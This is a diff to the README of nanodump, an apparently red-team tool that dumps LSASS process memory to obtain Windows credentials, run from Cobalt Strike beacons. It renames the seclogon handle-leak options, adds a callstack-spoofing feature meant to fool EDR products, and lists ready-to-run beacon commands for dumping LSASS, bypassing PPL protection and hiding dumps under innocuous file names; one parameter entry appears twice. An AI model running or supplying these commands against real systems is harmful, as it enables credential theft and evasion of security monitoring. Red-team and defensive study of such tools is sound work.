@@ -12,12 +12,13 @@ A flexible tool that creates a minidump of the LSASS process.
   <li><a href="#fork">Process forking</a></li>
   <li><a href="#snapshot">Snapshot</a></li>
   <li><a href="#handledup">Handle duplication</a></li>
-  <li><a href="#malseclogon">MalSecLogon</a></li>
-  <li><a href="#malseclogon-and-duplicate">MalSecLogon and handle duplication</a></li>
-  <li><a href="#malseclogon-race-condition">MalSecLogon race condition</a></li>
+  <li><a href="#seclogon-leak-local">Seclogon handle leak local</a></li>
+  <li><a href="#seclogon-leak-remote">Seclogon handle leak remote</a></li>
+  <li><a href="#seclogon-duplication">Seclogon handle duplication</a></li>
   <li><a href="#ssp">Load nanodump as an SSP</a></li>
   <li><a href="#ppl">PPL bypass</a></li>
   <li><a href="#wer">WerFault</a></li>
+  <li><a href="#spoof-callstack">Spoof the callstack</a></li>
   <li><a href="#params">Parameters</a></li>
   <li><a href="#examples">Examples</a></li>
   <li><a href="#redirectors">HTTPS redirectors</a></li>
@@ -116,22 +117,21 @@ As opening a handle to LSASS can be detected, nanodump can instead search for ex
 If one is found, it will copy it and use it to create the minidump.  
 Note that it is not guaranteed to find such handle.
 
-<h2 id="malseclogon">6. MalSecLogon</h2>
+<h2 id="seclogon-leak-local">6. Seclogon handle leak local</h2>
 
-To avoid opening a handle to LSASS, you can use MalSecLogon, which is a technique that (ab)uses `CreateProcessWithLogonW` to leak an LSASS handle.  
-To enable this feature, use the `--malseclogon` parameter.  
-Take into account that an unsigned nanodump binary needs to be written to disk to use this feature.
+To avoid opening a handle to LSASS, you can use abuse the seclogon service by calling `CreateProcessWithLogonW` to leak an LSASS handle into the nanodump binary.  
+To enable this feature, use the `--seclogon-leak-local` parameter.  
+Take into account that when used from Cobalt Strike, an unsigned nanodump binary needs to be written to disk to use this feature.
 
-<h2 id="malseclogon-and-duplicate">7. MalSecLogon and handle duplication</h2>
+<h2 id="seclogon-leak-remote">7. Seclogon handle leak remote</h2>
 
-As said before, using MalSecLogon requires a nanodump binary to be written to disk.  
-This can be avoided if `--malseclogon` and `--dup` are used together with `--binary`.  
-The trick is to leak a handle to LSASS using MalSecLogon, but instead of leaking it into nanodump.exe, leak it into another binary and then duplicate the leaked handle so that nanodump can used it.
+This technique is very similar to the previous one, but instead of leaking the handle into nanodump, it is leaked into another binary and then duplicated so that nanodump can used it.
+Use the `--seclogon-leak-remote` flag to access this functionality.
 
-<h2 id="malseclogon-race-condition">8. MalSecLogon race condition</h2>
+<h2 id="seclogon-duplication">8. Seclogon handle duplication</h2>
 
 You can trick the seclogon process to open a handle to LSASS and duplicate it before it is closed, by winning a race condition using file locks.
-Use the `--malseclogon-race` flag to access this functionality.
+Use the `--seclogon-duplicate` flag to access this functionality.
 
 <h2 id="ssp">9. Load nanodump as an SSP</h2>
 
@@ -188,11 +188,14 @@ Mode                 LastWriteTime         Length Name
 -a----         6/23/2022   7:40 AM        7862825 nanodump.x64.exe-(PID-3224).dmp
 ```
 
-<h2 id="params">12. Parameters</h2>
+<h2 id="spoof-callstack">12. Spoof the callstack</h2>
 
-#### --getpid
-Get PID of LSASS and leave.  
-This is just for convenience, nanodump does not need the PID of LSASS.
+You can open a handle to LSASS with a fake callstack, this makes the function call look a bit more legitimate.  
+The offsets used in this feature, are only valid for Windows 10.0.19044.1706 (21h2), in other versions, the callstack might not look as expected. 
+You can spoof the callstack of svchost, wmi and rpc.  
+To access this feature, use the paramter `--spoof-callstack` with the values `svchost`, `wmi` or `rpc`.  
+
+<h2 id="params">12. Parameters</h2>
 
 #### --write -w < path > (required for EXE)
 Where to write the dumpfile.
@@ -210,22 +213,31 @@ Fork LSASS and dump this new process.
 #### --snapshot -s
 Create a snapshot of LSASS and dump this new process.
 
-#### --dup -d
+#### --duplicate -d
 Try to find an existing handle to LSASS and duplicate it.
 
-#### --malseclogon -m
-Leak a handle to LSASS using MalSecLogon.  
-**If used as BOF, an unsigned binary will be written to disk unless --dup is also provided!**
+#### --seclogon-leak-local -sll
+Leak an LSASS handle into nanodump from the seclogon service  
+**If used from Cobalt Strike, an unsigned binary will be written to disk**  
 
-#### --binary -b < path >
-Path to a binary such as `C:\Windows\notepad.exe`.  
-This option is used exclusively with `--malseclogon` and `--dup`. 
+#### --seclogon-leak-remote -slr < binary path >
+Leak an LSASS handle into the specified binary and then duplicate it.  
 
-#### --malseclogon-race -mr
+#### --seclogon-duplicate -sd
 Force seclogon to open a handle to LSASS and duplicate it.  
 
+#### --seclogon-duplicate -sd
+Force seclogon to open a handle to LSASS and duplicate it.  
+
+#### --spoof-callstack -sc { svchost,wmi,rpc }
+Call NtOpenProcess with a fake function callstack.  
+
 #### --werfault -wf < folder >
-Path to the folder where the WerFault process will create an LSASS dump.  
+Force WerFault to dump LSASS in the specified folder.  
+
+#### --getpid
+Get PID of LSASS and leave.  
+This is just for convenience, nanodump does not need the PID of LSASS.
 
 <h2 id="examples">13. Examples</h2>
 
@@ -234,14 +246,14 @@ Read LSASS indirectly by creating a fork and write the dump to disk with an inva
 beacon> nanodump --fork --write C:\lsass.dmp
 ```
 
-Use MalSecLogon to leak an LSASS handle in a notepad process, duplicate that handle to get access to LSASS, then read it indirectly by creating a fork and download the dump  with a valid signature:
+Use the seclogon leak remote to leak an LSASS handle in a notepad process, duplicate that handle to get access to LSASS, then read it indirectly by creating a fork and download the dump  with a valid signature:
 ```
-beacon> nanodump --malseclogon --dup --fork --binary C:\Windows\notepad.exe --valid
+beacon> nanodump --seclogon-leak-remote C:\Windows\notepad.exe --fork --valid
 ```
 
-Get a handle with MalSecLogon, read LSASS indirectly by using a fork and write the dump to disk with a valid signature (a nanodump binary will be uploaded!):
+Get a handle with seclogon leak local, read LSASS indirectly by using a fork and write the dump to disk with a valid signature (a nanodump binary will be uploaded!):
 ```
-beacon> nanodump --malseclogon --fork --valid --write C:\Windows\Temp\lsass.dmp
+beacon> nanodump --seclogon-leak-local --fork --valid --write C:\Windows\Temp\lsass.dmp
 ```
 
 Download the dump with an invalid signature (default):
@@ -251,7 +263,7 @@ beacon> nanodump
 
 Duplicate an existing handle and write the dump to disk with an invalid signature:
 ```
-beacon> nanodump --dup --write C:\Windows\Temp\report.docx
+beacon> nanodump --duplicate --write C:\Windows\Temp\report.docx
 ```
 
 Get the PID of LSASS:
@@ -272,17 +284,22 @@ beacon> load_ssp \\10.10.10.10\openShare\nanodump_ssp.x64.dll
 
 Dump LSASS bypassing PPL, duplicating the handle that csrss.exe has on LSASS:
 ```
-beacon> nanodump_ppl --dup --write C:\Windows\Temp\lsass.dmp
+beacon> nanodump_ppl --duplicate --write C:\Windows\Temp\lsass.dmp
 ```
 
 Trick seclogon to open a handle to LSASS and duplicate it, then download the dump with an invalid signature:
 ```
-beacon> nanodump --malseclogon-race
+beacon> nanodump --seclogon-duplicate
 ```
 
 Make the WerFault.exe process create a full memory dump in the Temp folder:
 ```
 beacon> nanodump --werfault C:\Windows\Temp\
+```
+
+Open a handle to LSASS with an invalid callstack and download the minidump with an invalid signature:
+```
+beacon> nanodump --spoof-callstack svchost
 ```
 
 <h2 id="redirectors">14. HTTPS redirectors</h2>
@@ -315,3 +332,4 @@ location ~ ^...$ {
 - [James Forshaw](https://twitter.com/tiraniddo) for [Windows Exploitation Tricks: Exploiting Arbitrary Object Directory Creation for Local Elevation of Privilege](https://googleprojectzero.blogspot.com/2018/08/windows-exploitation-tricks-exploiting.html)
 - [itm4n](https://twitter.com/itm4n) for the original PPL userland exploit implementation, [PPLDump](https://github.com/itm4n/PPLdump).
 - [Asaf Gilboa](https://mobile.twitter.com/asaf_gilboa) for [Lsass Memory Dumps are Stealthier than Ever Before - Part 2](https://www.deepinstinct.com/blog/lsass-memory-dumps-are-stealthier-than-ever-before-part-2)
+- [William Burgess](https://twitter.com/joehowwolf) for [Spoofing Call Stacks To Confuse EDRs](https://labs.withsecure.com/blog/spoofing-call-stacks-to-confuse-edrs)
